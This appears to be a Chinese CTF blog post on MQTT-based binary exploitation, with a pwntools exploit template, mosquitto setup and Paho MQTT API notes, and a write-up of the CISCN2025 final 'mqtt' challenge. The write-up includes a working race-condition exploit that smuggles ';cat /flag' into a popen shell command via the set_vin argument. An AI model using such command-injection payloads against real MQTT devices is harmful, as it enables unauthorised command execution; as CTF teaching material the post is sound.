+++
title = 'Mqtt协议pwn'
date = 2026-02-02T12:25:12+08:00
draft = false
categories = ["pwn"]
hiddenFromHomePage=false
summary = ""
+++



<!--more-->



#### 模板

```py
from pwn import *
import paho.mqtt.client as mqtt
context.terminal = ["tmux", "splitw", "-h"]
context(os='linux',arch='amd64',log_level='debug')

address = './pwn'
# address = './pwn_patched'
elf = ELF(address)
libc = elf.libc

#-----------------------------------------------------------------
s       = lambda data               :p.send(data)
ss      = lambda data               :p.send(str(data))
sa      = lambda delim,data         :p.sendafter(str(delim), data)
sl      = lambda data               :p.sendline(data)
sls     = lambda data               :p.sendline(str(data))
sla     = lambda delim,data         :p.sendlineafter(delim, data)
r       = lambda num                :p.recv(num)
ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
itr     = lambda                    :p.interactive()
uu32    = lambda data               :u32(data.ljust(4,b'\x00'))
uu64    = lambda data               :u64(data.ljust(8,b'\x00'))
# lg      = lambda s,addr		        : log.info('\033[1;31;40m %s --> 0x%x \033[0m' % (s,addr))
lg      = lambda s			        : log.info('\033[1;31;40m %s --> 0x%x \033[0m' % (s, eval(s)))
l64     = lambda                    :u64(p.recvuntil("\x7f")[-6:].ljust(8,b"\x00"))
l32     = lambda                    :u32(p.recvuntil("\xf7")[-4:].ljust(4,b"\x00"))
r64     = lambda                    :u64(p.recv(6).ljust(8,b'\x00'))
ir64    = lambda                    :int(p.recv(14),16)
#-----------------------------------------------------------------
gdbscript = \
"""
    
    c
"""
if len(sys.argv) > 1 and sys.argv[1] == "r":
    p = remote("host.docker.internal",9999 )
elif len(sys.argv) > 1 and sys.argv[1] == "d":
    p = gdb.debug(address, gdbscript = gdbscript)
else:
    p = process(address)

def dbg():
    gdb.attach(p)
    # gdb.attach(p, gdbscript=gdbscript)
    # pause()

# ------------------------ MQTT 配置 ------------------------
MQTT_HOST = "127.0.0.1"
MQTT_PORT = 9999
MQTT_TOPIC_PUB = "diag/send"
MQTT_TOPIC_SUB = "diag/resp"

client = mqtt.Client()

def publish(topic,pl):
    result = client.publish(topic=topic, payload=pl)
    log.info(f"MQTT Published: {payload}")
    return result

def on_connect(client, userdata, flags, rc):
    log.info(f"MQTT Connected with code {rc}")
    client.subscribe(MQTT_TOPIC_SUB)
    client.subscribe("#") 

def on_message(client, userdata, msg):
    message = msg.payload.decode()
    log.info(f"MQTT Received on {msg.topic}: {message}")

client.on_connect = on_connect
client.on_message = on_message
client.connect(MQTT_HOST, MQTT_PORT, keepalive=60)
client.loop_start()

# 发送示例 payload
pl = b'aaaa'
publish(MQTT_TOPIC_PUB,pl)


itr()
```



#### 基础知识



##### 配置环境

```
sudo apt update
sudo apt install -y mosquitto mosquitto-clients
sudo systemctl enable mosquitto
sudo systemctl start mosquitto
```



测试服务：

打开两个终端，终端1：

```
mosquitto_sub -h localhost -t "test/topic"
```

| 参数              | 说明                                  |
| ----------------- | ------------------------------------- |
| `-h localhost`    | 指定 MQTT Broker 的地址（这里是本机） |
| `-t "test/topic"` | 订阅的主题（`test/topic`）            |

- **订阅（接收）** 某个 MQTT 主题（`test/topic`）的消息。
- 只要有人往 `test/topic` 发布消息，这个终端就会打印出来。



终端2：

```
mosquitto_pub -h localhost -t "test/topic" -m "Hello MQTT"
```

| 参数              | 说明                                  |
| ----------------- | ------------------------------------- |
| `-h localhost`    | 指定 MQTT Broker 的地址（这里是本机） |
| `-t "test/topic"` | 发布的目标主题                        |
| `-m "Hello MQTT"` | 消息内容（payload）                   |

- **发布（发送）** 一条消息到 `test/topic`。
- 订阅了 `test/topic` 的客户端（如终端 A）会收到这条消息。



更改配置文件

```
sudo vim /etc/mosquitto/mosquitto.conf
listener 9999 #设置监听端口为 9999
allow_anonymous true  # 可选，允许匿名访问（默认）
sudo systemctl restart mosquitto # 重启服务
```



之后

```
mosquitto_sub -h localhost -p 9999 -t "test/topic"
mosquitto_pub -h localhost -p 9999 -t "test/topic" -m "test"
```



##### Paho MQTT C

> Paho MQTT C 客户端是用 ANSI 标准 C 编写的功能齐全的 MQTT 客户端

Paho C 客户端包含四个变体库，包括共享库和静态库：

- **paho-mqtt3a** - 异步访问模式（asynchronous）(MQTTAsync)
- **paho-mqtt3as** - 带 SSL 的异步访问模式（asynchronous with SSL）(MQTTAsync)
- **paho-mqtt3c** - 同步访问模式（"classic" / synchronous）(MQTTClient)
- **paho-mqtt3cs** - 带 SSL 的同步访问模式（"classic" / synchronous with SSL）(MQTTClient)



**MQTTClient_create()**

```c
MQTTClient_create(
    MQTTClient* handle,         // 客户端句柄（输出参数）
    const char* serverURI,      // MQTT Broker 地址
    const char* clientId,       // 客户端唯一标识符
    int persistence_type,       // 持久化类型
    void* persistence_context   // 持久化上下文（通常为 NULL）
);

```

此函数创建一个 MQTT 客户端，以便连接到指定的服务器并使用指定的持久性存储



**MQTTClient_setCallbacks()**

```c
void MQTTClient_setCallbacks(
    MQTTClient handle,                // MQTT 客户端句柄
    void* context,                    // 用户自定义上下文（传给回调函数）
    MQTTClient_connectionLost* cl,    // 连接丢失回调
    MQTTClient_messageArrived* ma,    // 消息到达回调
    MQTTClient_deliveryComplete* dc   // 消息交付完成回调
);
```



```c
typedef void MQTTClient_connectionLost(void* context, char* cause);
typedef int MQTTClient_messageArrived(void* context, char* topicName, int topicLen, MQTTClient_message* message);
typedef void MQTTClient_deliveryComplete(void* context, MQTTClient_deliveryToken dt);
```





**MQTTClient_connect()**

```c
int MQTTClient_connect(
    MQTTClient handle,              // MQTT 客户端句柄
    MQTTClient_connectOptions* opts // 连接选项（超时、用户名、密码等）
);
```

```c
typedef struct {
    char* struct_id;               // 固定值 "MQTC"（标识结构体版本）
    int struct_version;            // 结构体版本（通常为 0）
    int keepAliveInterval;         // 心跳间隔（秒）
    int cleansession;              // 是否清除会话（1=是，0=否）
    int reliable;                  // 是否可靠传输（通常为 0）
    MQTTClient_willOptions* will;  // 遗嘱消息选项（可选）
    char* username;                // 用户名（可选）
    char* password;                // 密码（可选）
    int connectTimeout;            // 连接超时（秒）
    int retryInterval;             // 重试间隔（秒）
    int SSL;                       // 是否启用 SSL（1=是，0=否）
    // ... 其他字段（取决于版本）
} MQTTClient_connectOptions;
```

连接成功返回**0**



**MQTTClient_subscribe()**

```c
int MQTTClient_subscribe(
    MQTTClient handle,      // MQTT 客户端句柄（由 `MQTTClient_create` 创建）
    const char* topic,      // 要订阅的主题（如 `"diag"`）
    int qos                 // 服务质量等级（0、1 或 2）
);
```

| 参数     | 类型          | 说明                                                         |
| -------- | ------------- | ------------------------------------------------------------ |
| `handle` | `MQTTClient`  | MQTT 客户端句柄（标识唯一的客户端连接）                      |
| `topic`  | `const char*` | 要订阅的主题名（如 `"diag"`）                                |
| `qos`    | `int`         | **服务质量等级**（决定消息传输的可靠性）：<br> • `0`：最多一次（可能丢失）<br> • `1`：至少一次（可能重复）<br> • `2`：恰好一次（可靠但性能较低） |





**MQTTClient_publishMessage()** 

```c
int MQTTClient_publishMessage(
    MQTTClient handle,           // MQTT 客户端句柄
    const char *topicName,       // 发布主题（如 "diag/resp"）
    MQTTClient_message *message, // 消息内容结构体（v3）
    MQTTClient_deliveryToken *dt // 输出参数：异步操作令牌（&v2）
);
```

| 参数        | 类型                        | 说明                                                         |
| ----------- | --------------------------- | ------------------------------------------------------------ |
| `handle`    | `MQTTClient`                | 由 `MQTTClient_create()` 创建的客户端句柄                    |
| `topicName` | `const char*`               | 消息发布的主题（如 `"diag/resp"`）                           |
| `message`   | `MQTTClient_message*`       | 消息内容结构体（需提前初始化）                               |
| `dt`        | `MQTTClient_deliveryToken*` | 输出参数，用于跟踪异步发布状态（令牌可用于 `waitForCompletion`） |

```c
typedef struct {
    char        struct_id[4];      // 标识符（固定为 "MQTM"）
    int         struct_version;    // 结构体版本号（通常为 0）
    int         payloadlen;        // 负载数据长度（字节数）
    void*       payload;           // 负载数据指针（二进制安全）
    int         qos;               // 服务质量等级（0/1/2）
    int         retained;          // 是否保留消息（0 或 1）
    int         dup;               // 是否为重复消息（0 或 1）
    int         msgid;             // 消息 ID（QoS > 0 时有效）
    MQTTProperties properties;     // MQTT 5.0 属性（可选）
} MQTTClient_message;
```





**MQTTClient_waitForCompletion()** 

```c
int MQTTClient_waitForCompletion(
    MQTTClient handle,  // MQTT 客户端句柄
    MQTTClient_deliveryToken dt,  // 异步操作令牌（delivery token）
    unsigned long timeout  // 超时时间（毫秒）
);
```

| 参数      | 类型                       | 说明                                                       |
| --------- | -------------------------- | ---------------------------------------------------------- |
| `handle`  | `MQTTClient`               | MQTT 客户端句柄，由 `MQTTClient_create()` 创建             |
| `dt`      | `MQTTClient_deliveryToken` | **异步操作令牌**，通常来自 `MQTTClient_publish()` 的返回值 |
| `timeout` | `unsigned long`            | 最大等待时间（毫秒），`10000` 表示 10 秒                   |

##### Paho MQTT python

[pypi](https://pypi.org/project/paho-mqtt/#installation)

[docs](https://eclipse.dev/paho/files/paho.mqtt.python/html/client.html)

安装

```
pip3 install paho-mqtt
```

订阅者（Subscriber）

```py
import paho.mqtt.client as mqtt

# 当客户端连接 broker 成功时回调
def on_connect(client, userdata, flags, rc):
    print("Connected with result code", rc)
    client.subscribe("test/topic")

# 当收到消息时回调
def on_message(client, userdata, msg):
    print(f"[{msg.topic}] {msg.payload.decode()}")

client = mqtt.Client()
client.on_connect = on_connect
client.on_message = on_message

client.connect("broker.emqx.io", 1883, 60)
client.loop_forever()

```

发布者（Publisher）

```py
import paho.mqtt.client as mqtt

client = mqtt.Client()
client.connect("broker.emqx.io", 1883, 60)

client.publish("test/topic", "Hello MQTT from Python!")
client.disconnect()

```

###### API



**创建与配置客户端**

```py
import paho.mqtt.client as mqtt

# 创建客户端实例
client = mqtt.Client(client_id="", clean_session=True, userdata=None, protocol=mqtt.MQTTv311, transport="tcp")

```

参数说明：

- `client_id`：客户端 ID，默认为随机。broker 用它区分不同客户端。
- `clean_session`：是否清除会话（True = 断开后不保留订阅信息）。
- `protocol`：MQTT 协议版本（MQTTv311、MQTTv31、MQTTv5）。
- `transport`：传输方式（默认 `"tcp"`，也支持 `"websockets"`）。



**认证**

```py
client.username_pw_set(username="user", password="pass")
```





**连接与断开**

```py
client.connect(host="broker.emqx.io", port=1883, keepalive=60)
client.disconnect()
```

- `host`：MQTT 服务器地址
- `port`：端口，默认 1883



**发布与订阅**

```py
#订阅
client.subscribe("test/topic", qos=1)
#取消订阅
client.unsubscribe("test/topic")
#发布
client.publish("test/topic", payload="hello", qos=1, retain=False)
```

发布参数：

- `payload`：消息内容（字符串、字节）
- `qos`：QoS 等级（0/1/2）
- `retain`：是否保留消息



**阻塞循环**

```py
#最常用
client.loop_forever()
```



**回调函数**

这些函数需要绑定到 client 上

```py
#连接成功
def on_connect(client, userdata, flags, rc):
    print("Connected with result code", rc)
client.on_connect = on_connect

#收到消息
def on_message(client, userdata, msg):
    print(f"{msg.topic}: {msg.payload.decode()}")
client.on_message = on_message

#断开连接
def on_disconnect(client, userdata, rc):
    print("Disconnected with result code", rc)
client.on_disconnect = on_disconnect

#发布消息结果
def on_publish(client, userdata, mid):
    print("Message published, mid:", mid)
client.on_publish = on_publish

#订阅结果
def on_subscribe(client, userdata, mid, granted_qos):
    print("Subscribed, mid:", mid, "QoS:", granted_qos)
client.on_subscribe = on_subscribe

```

参数说明：

`on_connect(client, userdata, flags, rc)`

- **client**：当前 `Client` 实例（就是 `mqtt.Client()` 返回的对象）。
- **userdata**：用户自定义数据（如果你调用过 `client.user_data_set(obj)`，这里会传入那个 `obj`）。
- **flags**：字典，包含连接时的标志位信息，比如：
	- `flags["session present"]`：表示这次会话是否是新建的 (`0` 新建，`1` 表示恢复之前的会话)。
- **rc**：连接结果码（Return Code）：
	- `0` → 成功连接
	- `1` → 协议版本错误
	- `2` → 客户端 ID 无效
	- `3` → 服务器不可用
	- `4` → 用户名/密码错误
	- `5` → 未授权
	- 其他值 → 未知错误



`on_message(client, userdata, msg)`

- **client**：同上，客户端实例。
- **userdata**：同上，自定义数据。
- **msg**：`MQTTMessage` 对象，包含收到的消息：
	- `msg.topic` → 消息主题（字符串）
	- `msg.payload` → 消息内容（bytes，需要 `.decode()`）
	- `msg.qos` → 消息 QoS 等级（0/1/2）
	- `msg.retain` → 是否是保留消息（布尔值）





`on_disconnect(client, userdata, rc)`

- **client**：客户端实例。
- **userdata**：自定义数据。
- **rc**：断开原因码：
	- `0` → 正常断开
	- 非 `0` → 意外断开（例如网络中断、broker 关闭连接等）



`on_publish(client, userdata, mid)`

- **client**：客户端实例。
- **userdata**：自定义数据。
- **mid**：消息 ID（Message ID），用来唯一标识这条发布的消息。
	- 如果你调用 `client.publish()`，这个 mid 会告诉你是哪一条消息被 broker 确认了。





`on_subscribe(client, userdata, mid, granted_qos)`

- **client**：客户端实例。
- **userdata**：自定义数据。
- **mid**：消息 ID（对应你调用 `client.subscribe()` 时生成的 ID）。
- **granted_qos**：broker 实际给你分配的 QoS（可能比你请求的低）。
	- 比如你请求 `qos=2`，但 broker 只支持 `qos=1`，那返回值就是 `[1]`。



模板

```py

```





#### 例题

##### CISCN2025final_mqtt

```
ln -sfn libpaho-mqtt3c.so.1.3.9 libpaho-mqtt3c.so.1
ln -sfn libcjson.so.1.7.15 libcjson.so.1
```



```c
__int64 __fastcall main(int a1, char **a2, char **a3)
{
	// ...
  if ( read_file("/mnt/VIN") && read_file("/mnt/version") )
  {
	// ...
  }
  fwrite("miss file.\n", 1u, 0xBu, stderr);
  return 1;
}
```

需要创建两个文件

条件竞争的题，会创建多个线程

```c
      else if ( !strcmp(cmd, "set_vin") )
      {
        if ( (unsigned int)sub_158A(arg) )
        {
          sleep(2u);
          snprintf(s, 0x100u, "echo -n %s>/mnt/VIN;cat /mnt/VIN", arg);
          puts(s);
          v4 = popen(s, "r");
          ptr = 0x203A746572LL;
          v10 = 0;
          v11 = 0;
          v12 = 0;
          v13 = 0;
          v14 = 0;
          v15 = 0;
          v16 = 0;
          fread((char *)&ptr + 5, 1u, 0x3Fu, v4);
          pclose(v4);
          puts((const char *)&ptr);
          publish_msg((const char *)&ptr);
          strncpy(dest_VIN_bss, arg, 0x3Fu);
          encode_to((__int64)dest_VIN_bss, VIN_encode);
        }
```

exp:

```py
#! /usr/bin/python3
import random
from pwn import *
import time
import paho.mqtt.client as mqtt
import json
context(log_level = "debug",os = "linux",arch = "amd64")
pwnFile = "./pwn"
libcFile = "./libc.so.6"
ip = "127.0.0.1"
local = ""
local_port = 9999
port = 9999
elf = ELF(pwnFile)
libc = ELF(libcFile)
def debug(value):
    if value==1:
        io = process(pwnFile)
    else:
        io = remote(ip,port)
    return io


def dbg(msg=""):
    gdb.attach(io,msg)

def publish(client,topic,auth,cmd,arg):
    msg = {
        "auth":auth,
        "cmd":cmd,
        "arg":arg
    }
    result = client.publish(topic = topic, payload = json.dumps(msg))
    print(json.dumps(msg))
    print(result)
    return result

def on_connect(client, userdata, flags, rc):
    client.subscribe("vehicle_diag")
    client.subscribe("diag")
    client.subscribe("#")  # 订阅所有
    client.subscribe("diag/resp")
    print("Connected with result code " + str(rc))

def on_subscribe(client,userdata,mid,granted_qos):
    print("消息发送成功")

def on_message(client, userdata, msg):
    message = msg.payload.decode()# Decode message payload
    print(f"Received message on topic '{msg.topic}': {message}")
    # try:
    #     data = json.loads(message)  # 解析为字典
    #     dest = data.get("vin")  # 获取vin字段
    #     log.success("dest -> "+ dest)
    # except json.JSONDecodeError:
    #     print("JSON解析失败")
    print(message)

def sum2hex(dest):
    v3 = 0
    for i in range(len(dest)):
        v3 = (0x1f  * v3 +  ord(dest[i])) & 0xffffffff
    log.success(f"sum2hex -> {v3:08x}")
    return  f"{v3:08x}"

io = debug(0)
#gdb.attach(io,'b *$rebase(0x1EC0)')
topic = "diag"
client = mqtt.Client()

client.on_connect = on_connect
client.on_message = on_message
client.on_subscribe = on_subscribe
client.connect(host = "127.0.0.1",port = 9999,keepalive=10000)   

auth = sum2hex("test")

publish(client,"diag",auth,"set_vin","111111111111")
sleep(0.5)
publish(client,"diag",auth,"set_vin",";cat /flag")
publish(client,"diag",auth,"set_vin",";cat /flag")
sleep(1)

client.loop_start()

io.interactive()
```

















































##### 湾区杯2024初赛





















##### rwctf2022_Who Moved My Block

https://r3kapig.com/writeup/20220125-rwctf4/#who-moved-my-block





#### 参考文章

[mqtt 协议pwn入门](https://bbs.kanxue.com/thread-287727.htm)
